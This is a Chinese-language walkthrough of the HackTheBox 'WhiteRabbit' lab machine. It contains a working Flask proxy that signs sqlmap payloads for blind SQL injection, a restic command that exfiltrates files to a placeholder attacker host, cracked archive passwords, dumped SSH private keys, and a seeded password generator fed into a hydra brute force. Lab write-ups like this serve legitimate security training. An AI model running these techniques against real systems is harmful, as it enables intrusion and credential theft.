---
layout: config.default_layout
title: HackTheBox-Season7-WhiteRabbit
date: 2025-04-07 19:30:10
updated: 2025-04-07 19:31:11
comments: true
tags: [HackTheBox,Linux靶机,逆向分析,SQL注入,encrypt]
categories: 靶机
---

# Season7-WhiteRabbit

> https://app.hackthebox.com/competitive/7/overview | `Insane`
> 

## 前期踩点

```bash
⚡ root@kali  ~/Desktop/test/whiterabbit  nmap -sT -min-rate 10000 -p- 10.10.11.63
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-06 23:29 EDT
Warning: 10.10.11.63 giving up on port because retransmission cap hit (10).
Nmap scan report for whiterabbit.htb (10.10.11.63)
Host is up (0.30s latency).
Not shown: 34479 filtered tcp ports (no-response), 31053 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 150.51 seconds
```

将 `whiterabbit.htb` 写入 hosts 文件

```bash
⚡ root@kali  ~/Desktop/test/whiterabbit  nmap -sT -A -T4 -O -p 22,80,2222 10.10.11.63
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-06 23:32 EDT
Nmap scan report for whiterabbit.htb (10.10.11.63)
Host is up (0.45s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0f:b0:5e:9f:85:81:c6:ce:fa:f4:97:c2:99:c5:db:b3 (ECDSA)
|_  256 a9:19:c3:55:fe:6a:9a:1b:83:8f:9d:21:0a:08:95:47 (ED25519)
80/tcp   open  http    Caddy httpd
|_http-title: White Rabbit - Pentesting Services
|_http-server-header: Caddy
2222/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c8:28:4c:7a:6f:25:7b:58:76:65:d8:2e:d1:eb:4a:26 (ECDSA)
|_  256 ad:42:c0:28:77:dd:06:bd:19:62:d8:17:30:11:3c:87 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   457.81 ms 10.10.16.1
2   294.36 ms whiterabbit.htb (10.10.11.63)
```

访问 `HTTP` 服务，`caddy` 搭建的 web

![image.png](image.png)

```bash
⚡ root@kali  ~/Desktop/test/whiterabbit  whatweb whiterabbit.htb                     
http://whiterabbit.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Caddy], IP[10.10.11.63], Script, Title[White Rabbit - Pentesting Services]
```

再爆一下子域名，爆出来 `status.whiterabbit.htb`

```bash
⚡ root@kali  ~/Desktop/test/whiterabbit  gobuster vhost -u http://whiterabbit.htb --append-domain -w ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-5000.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://whiterabbit.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: status.whiterabbit.htb Status: 302 [Size: 32] [--> /dashboard]
Found: status.whiterabbit.htb Status: 302 [Size: 32] [--> /dashboard]
```

添加到 `hosts` ，再打开搭建的是 `Kuma` (Uptime Kuma is an easy-to-use self-hosted monitoring tool.

Uptime Kuma 是一个易于使用的自托管监控工具。)

![image.png](image1.png)

## 模糊测试

在`http://whiterabbit.htb` 中无法找到任何有效信息

`Kuma` 存在几个CVE，但是有的需要正常进入的凭据，或者就是难以利用

对 `kuma` 进行目录扫描，也没扫出来什么

```bash
⚡ root@kali  ~/Desktop/test/whiterabbit  gobuster dir -u http://status.whiterabbit.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,502,429 --no-error --exclude-length 2444
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://status.whiterabbit.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   429,404,403,502
[+] Exclude Length:          2444
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/screenshots          (Status: 301) [Size: 189] [--> /screenshots/]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/upload               (Status: 301) [Size: 179] [--> /upload/]
/Screenshots          (Status: 301) [Size: 189] [--> /Screenshots/]
/metrics              (Status: 401) [Size: 0]
/Upload               (Status: 301) [Size: 179] [--> /Upload/]
```

换个思路，我们对 `Kuma` 的 Docs 进行检索 ：https://github.com/louislam/uptime-kuma/wiki

找到了 **Status Page** ，格式为 `http://example.com/status/default` default 为特别的 slug

为什么找 `Status Page`？因为监控需要提供 URl，提供的很有可能就是我们没有模糊测试出来的子域名

![image.png](image2.png)

从网上的文章中可以看到是自己配置的

![image.png](image3.png)

对其进行模糊测试

```bash
⚡ root@kali  ~/Desktop/test/whiterabbit  wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hl=38 -u http://status.whiterabbit.htb/status/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://status.whiterabbit.htb/status/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                           
=====================================================================

000001471:   200        40 L     152 W      3359 Ch     "temp"         
```

模糊到`temp` ，访问一下，成功访问，并且找到子域名

![image.png](image4.png)

```bash
ddb09a8558c9.whiterabbit.htb
a668910b5514e.whiterabbit.htb
```

都去访问一下`a668910b5514e.whiterabbit.htb`

![image.png](image5.png)

![image.png](image6.png)

在下面能找到：

![image.png](image7.png)

下载 `json` 文件查看（喂给GPT），这是 `n8n` 工作流

密钥，数据包上的`x-gophish-signature: sha256=` 就是通过密钥加密了`Body`后得到的，所以每构造一个数据包就要重新使用密钥对`Body`进行加密

```bash
"parameters": {
        "action": "hmac",
        "type": "SHA256",
        "value": "={{ JSON.stringify($json.body) }}",
        "dataPropertyName": "calculated_signature",
        "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
}
```

这个整个 JSON，要以 **字符串形式** 参与 HMAC 计算：

```

{"campaign_id":1,"email":"test@ex.com","message":"Clicked Link"}
```

（注意：字段顺序不能变，空格会影响计算）

## SQL 注入

这一处可能存在`SQL`注入

```bash
"parameters": {
        "operation": "executeQuery",
        "query": "SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1",
        "options": {}
      },
.....
```

触发的是对应的数据包`Webhook`上的`email`参数

```bash
POST /webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d HTTP/1.1
Host: 28efa8f7df.whiterabbit.htb
x-gophish-signature: sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
Content-Length: 81

{
  "campaign_id": 1,
  "email": "test@ex.com",
  "message": "Clicked Link"
}
```

将`28efa8f7df.whiterabbit.htb`添加到`hosts`文件

构造数据包

```bash
{"campaign_id":2,"email":"test\" -- -","message":"Clicked Link"}
```

构造`sha256`，使用`cyberchef`

![image.png](image8.png)

闭合成功，存在 `SQL` 注入

![image.png](image9.png)

看回显是无法使用联合查询了，只能使用布尔盲注时间盲注之类的，并且手工测试难度高时间长

编写脚本（参考大佬的脚本改编的，学习思路）

```bash
import hmac
import hashlib
import json
import flask
import requests
app = flask.Flask(__name__)

url = 'http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d'
secret = "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"

data = {
    "campaign_id": 2,
    "message": "Clicked Link"
}

# 开启 Flask 服务器，将 sqlmap 的请求通过 Flask 传递到靶机上
@app.route('/webhook', methods=['GET'])
def _():
    # 首先检查参数email是否存在
    email = flask.request.values.get('email')
    if email is None:
        return flask.abort(400)
    try:
        # 存在则拼接 data
        e = data.copy()
        e['email'] = email
        new_data = json.dumps(e, separators=(',', ':'))
        # 生成签名
        signature = hmac.new(
            secret.encode(),
            new_data.encode(),
            hashlib.sha256
        ).hexdigest()
        # 设置头部
        headers = {'Content-Type': 'application/json','x-gophish-signature': f"sha256={signature}"}
        # 使用参数请求靶机
        r = requests.post(url, data=new_data, headers=headers)
        # 将响应返回给Sqlmap
        print(r.text)
        return r.text
    except Exception as e:
        return flask.abort(400)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
```

```bash
python sql.py
sqlmap -u 127.0.0.1:5000/webhook?email=test --level=5 --risk=3
```

超级慢

```bash
⚡ root@kali  ~/Desktop/test/whiterabbit  sqlmap -u "127.0.0.1:5000/webhook?email=test" --level=5 --risk=3 --dbms=mysql --technique=B
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.11#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:36:21 /2025-04-07/

[05:36:21] [INFO] testing connection to the target URL
[05:36:30] [INFO] testing if the target URL content is stable
[05:36:34] [INFO] target URL content is stable
[05:36:34] [INFO] testing if GET parameter 'email' is dynamic
[05:36:37] [WARNING] GET parameter 'email' does not appear to be dynamic
[05:36:44] [INFO] heuristic (basic) test shows that GET parameter 'email' might be injectable (possible DBMS: 'MySQL')
[05:36:48] [INFO] testing for SQL injection on GET parameter 'email'
[05:36:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:39:24] [WARNING] reflective value(s) found and filtering out
[05:45:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:51:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:57:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:57:57] [INFO] GET parameter 'email' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[05:57:57] [INFO] checking if the injection point on GET parameter 'email' is a false positive

sqlmap identified the following injection point(s) with a total of 331 HTTP(s) requests:
---
Parameter: email (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: email=test" AND 5729=(SELECT (CASE WHEN (5729=5729) THEN 5729 ELSE (SELECT 2985 UNION SELECT 6251) END))-- -
---
[06:03:10] [INFO] testing MySQL
[06:03:15] [INFO] confirming MySQL
[06:03:29] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[06:03:34] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 06:03:34 /2025-04-07/
```

通过表查询的到下面的表内容

```bash
Database: temp
Table: command_log
[6 entries]
+----+---------------------+------------------------------------------------------------------------------+
| id | date                | command                                                                      |
+----+---------------------+------------------------------------------------------------------------------+
| 1  | 2024-08-30 10:44:01 | uname -a                                                                     |
| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |
| 3  | 2024-08-30 11:58:36 | echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd                       |
| 4  | 2024-08-30 11:59:02 | rm -rf .bash_history                                                         |
| 5  | 2024-08-30 11:59:47 | #thatwasclose                                                                |
| 6  | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd |
+----+---------------------+------------------------------------------------------------------------------+
```

## Restic

可以看到使用restic来备份数据，密码也泄露了，所以我们直接恢复数据

```bash
⚡ root@kali  ~/Desktop/test/whiterabbit  restic -r rest:http://75951e6ff.whiterabbit.htb restore latest --target ./bak
enter password for repository: 
repository 5b26a938 opened (version 2, compression level auto)
[0:08] 100.00%  5 / 5 index files loaded
restoring snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit to ./bak
Summary: Restored 5 files/dirs (572 B) in 0:07
```

能得到一个`7z`文件

```bash
⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  ls
bob.7z
```

解压需要密码，开膛手就绪

```bash
⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  7z2john bob.7z > 7z_hash 
ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
 
⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  john --wordlist=/usr/share/wordlists/rockyou.txt 7z_hash            
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 3 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Cost 4 (data length) is 365 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1q2w3e4r5t6y     (bob.7z)     
1g 0:00:03:12 DONE (2025-04-07 05:49) 0.005185g/s 124.1p/s 124.1c/s 124.1C/s 241287..shanefilan
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

得到密码`1q2w3e4r5t6y` ，进行解压

```bash
⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  ls
7z_hash  bob  bob.7z  bob.pub  config
```

```bash
⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  cat config             
Host whiterabbit
  HostName whiterabbit.htb
  Port 2222
  User bob
 ⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  cat bob   
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4wAAAJAQ+wJXEPsC
VwAAAAtzc2gtZWQyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4w
AAAEBqLjKHrTqpjh/AqiRB07yEqcbH/uZA5qh8c0P72+kSNW8NNTJHAXhD4DaKbE4OdjyE
FMQae80HRLa9ouGYdkLjAAAACXJvb3RAbHVjeQECAwQ=
-----END OPENSSH PRIVATE KEY-----
 ⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  cat bob.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG8NNTJHAXhD4DaKbE4OdjyEFMQae80HRLa9ouGYdkLj root@lucy
```

使用`SSH`私钥进行登录，默认端口需要密码

```bash
⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  ssh bob@10.10.11.63 -i bob
bob@10.10.11.63's password: 
```

尝试 `2222` 端口

```bash
⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  ssh bob@10.10.11.63 -i bob -p 2222
The authenticity of host '[10.10.11.63]:2222 ([10.10.11.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:jWKKPrkxU01KGLZeBG3gDZBIqKBFlfctuRcPBBG39sA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.11.63]:2222' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sun Apr  6 20:29:14 2025 from 10.10.14.118
bob@ebdce80611e9:~$ 
```

## 提权 - morpheus

寻找`user.txt` ,没找到，那么还需要操作..

```bash
find / -name user.txt 2>/dev/null
```

查看权限，可以以`Root`权限执行`restic`

```bash
bob@ebdce80611e9:~$ sudo -l
Matching Defaults entries for bob on ebdce80611e9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bob may run the following commands on ebdce80611e9:
    (ALL) NOPASSWD: /usr/bin/restic
```

在 https://gtfobins.github.io/gtfobins/restic/ 能找到利用方法，获取文件

```bash
// 利用方法
RHOST=attacker.com
RPORT=12345
LFILE=file_or_dir_to_get
NAME=backup_name
sudo restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
```

```bash
sudo restic init -r /tmp/bak
sudo restic backup -r "/tmp/bak" "/root"
sudo restic -r /tmp/bak dump latest /root > data.txt
```

```bash
cat data.txt
....
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQS/TfMMhsru2K1PsCWvpv3v3Ulz5cBP
UtRd9VW3U6sl0GWb0c9HR5rBMomfZgDSOtnpgv5sdTxGyidz8TqOxb0eAAAAqOeHErTnhx
K0AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+w
Ja+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR
4AAAAhAIUBairunTn6HZU/tHq+7dUjb5nqBF6dz5OOrLnwDaTfAAAADWZseEBibGFja2xp
c3QBAg==
-----END OPENSSH PRIVATE KEY-----                                                                     
root/morpheus.pub0000644000000000000000000000027214664326641014426 0ustar00rootroot00000000000000ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+wJa+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR4= morpheus@whiterabbit.htb
```

将私钥保存为`morpheus`后使用私钥进行登录

```bash
⚡ root@kali  ~/Desktop/test/whiterabbit  ssh morpheus@10.10.11.63 -i morpheus
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Apr 7 10:23:46 2025 from 10.10.16.14
morpheus@whiterabbit:~$ 
```

在当前目录下可以找到 `user.txt`

```bash
morpheus@whiterabbit:~$ cat user.txt
7b5da670be642bef9c6969e85ee2da7b
```

## 提权 - root

在之前`SQL`注入的时候能发现这个，感觉和提权是有关的

```bash
 cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd 
```

执行之后会生成一段密码

```bash
morpheus@whiterabbit:/opt/neo-password-generator$ ./neo-password-generator 
ruJ8Eyc9ZAIYVqPfUXo9
```

但是密码还是不对的

```bash
⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  ssh neo@10.10.11.63                 
neo@10.10.11.63's password: 
Permission denied, please try again.       
```

将程序拉出来进行逆向（不会），使用好友的脚本

> 大概就是**获取当前时间**（精确到微秒），并将其结果保存在传入的 `struct timeval` 类型变量中。
> 
> 
> 然后使用时间戳（精度为毫秒）作为种子，调用 `generate_password` 函数。这个表达式的含义是：
> 
> - `tv.tv_sec` 是当前的秒数
> - `tv.tv_usec / 1000` 是当前微秒数转为毫秒
> - 所以 `1000 * tv.tv_sec + tv.tv_usec / 1000` 是一个当前时间的 **毫秒数**
> 
> 这个数值被作为种子或参数传入 `generate_password` 函数，可能用来生成基于时间的随机密码。
> 
> 而他生成密码时的时间是`2024-08-30 14:40:42` ，所以我们可以将该时间`/ 1000` 作为种子，生成一系列密码，其中一个密码就是正确的
>

```bash
import ctypes
import sys

# 根据平台加载适当的C库。
if sys.platform.startswith('linux'):
    libc = ctypes.CDLL("libc.so.6")  # Linux平台
elif sys.platform == "darwin":
    libc = ctypes.CDLL("libc.dylib")  # macOS平台
elif sys.platform.startswith('win'):
    libc = ctypes.CDLL("msvcrt.dll")  # Windows平台
else:
    raise Exception("不支持的操作系统平台")

def generate_password(seed):
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"  # 密码字符集
    # 使用C库的srand()设置种子
    libc.srand(seed)
    password = []
    for _ in range(20):
        # 调用C库的rand()生成随机数
        r = libc.rand()
        index = r % len(charset)  # 保证生成的索引在字符集长度范围内（62个字符）
        password.append(charset[index])  # 添加字符到密码列表
    print("".join(password))  # 打印生成的密码

def main():
    # 2024-08-30 14:40:42 UTC的Unix时间戳
    base_time_sec = 1725028842
    # 遍历该秒内的1000毫秒
    for ms in range(1000):
        seed = base_time_sec * 1000 + ms  # 生成种子，包含毫秒部分
        generate_password(seed)  # 生成并打印密码

if __name__ == '__main__':
    main()  # 运行主函数
```

使用后会生成密码字典，然后使用九头蛇爆破`neo`即可

```bash
⚡ root@kali  ~/Desktop/test/whiterabbit  python get_pass.py > pass.txt                           
 ⚡ root@kali  ~/Desktop/test/whiterabbit  hydra -l neo -P pass.txt -Vv -t 12 10.10.11.63 ssh           
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
                                                                                                         
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-07 07:16:27                   
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 12 tasks per 1 server, overall 12 tasks, 1000 login tries (l:1/p:1000), ~84 tries per task
[DATA] attacking ssh://10.10.11.63:22/                                                                   
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done                                           
[INFO] Testing if password authentication is supported by ssh://neo@10.10.11.63:22                   
[22][ssh] host: 10.10.11.63   login: neo   password: WBSxhWgfnMiclrV4dqfj                           
[STATUS] attack finished for 10.10.11.63 (waiting for children to complete tests)                   
1 of 1 target successfully completed, 1 valid password found                                        
[WARNING] Writing restore file because 1 final worker threads did not complete until end.           
[ERROR] 1 target did not resolve or could not be connected                                          
[ERROR] 0 target did not complete                                                                        
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-07 07:17:34    
```

得到密码`WBSxhWgfnMiclrV4dqfj` 

所有权限（哭）

```bash
⚡ root@kali  ~/Desktop/test/whiterabbit  ssh neo@10.10.11.63                                                                       
neo@10.10.11.63's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Apr 7 11:01:53 2025 from 10.10.16.14
neo@whiterabbit:~$ sudo -l
[sudo] password for neo: 
Matching Defaults entries for neo on whiterabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User neo may run the following commands on whiterabbit:
    (ALL : ALL) ALL
```

读取`root.txt`

```bash
neo@whiterabbit:~$ sudo cat /root/root.txt
19ffb49812c4ca4f8273aab4bd9dd5e9
```

## 总结

难，入口找了好久。没提示真没注意到Json文件还藏着SQL注入的信息，但是注入的时间也太长了。最后还是逆向分析（不会），突然发现HTB 上的 Linux靶机，在Hard难度上的基本都是逆向。
